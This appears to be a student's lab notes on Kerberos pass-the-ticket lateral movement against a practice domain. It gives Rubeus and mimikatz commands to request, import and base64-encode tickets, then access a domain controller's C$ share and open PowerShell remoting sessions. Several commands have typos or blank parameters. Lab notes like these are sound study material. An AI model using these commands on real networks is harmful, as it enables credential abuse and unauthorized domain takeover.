Using tickets to move laterally 

# Using `/ptt` to submit the ticket to the current logon session 
```powershell 
Rubeus.exe asktgt /domain: /user: /rc4: /ptt 
```
Another way is to import the ticket into the current session using the `.kirbi` file from the disk.
```powershell 
Rubues.exe ptt /ticket:[0;6c680]-2-0-40e10000-user-ticket.kirbi
```
it has to display succesffuly imported
`dir \\DC01.inlanefreight.htb\c$`
convert .krbi to base64 
```powershell 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
pass the key 
```powershell 
Rubeus.exe ptt /ticket:base64 
```

# Using `kerberos:ptt`
```powershell
mimikatz.exe privilege::debug "kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"" exit
```

# Powershell remoting 
- Enabled powershell remoting creates HTTP(5985) and HTTPs(5986) listeners 
- Admins can run scripts remotely 
- Remote Management Users group
- explicit PowerShell Remoting permissions
After importing with mimikatz
- open a PowerShell console and connect to the target machine.
- use the command `Enter-PSSession` to connect to the target machine.
```powershell 
Enter-PSSession -ComputerName DC01
```

Using Rubeus:
1. Create a sacrificial process, `createnetonly`
```powershell
Rubeus.exe createnetonly  /program:"c:\windows\system32\cmd.exe" /show
```
 The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
 2. Pas the ticketr
 ```powershell
Rubues.exe asktgt /domain: /user: /rc4: /ptt
 ```
 3. Enter ps session 
 ```powershell 
 Enter-PSSession -ComputerName DC01
 ```
 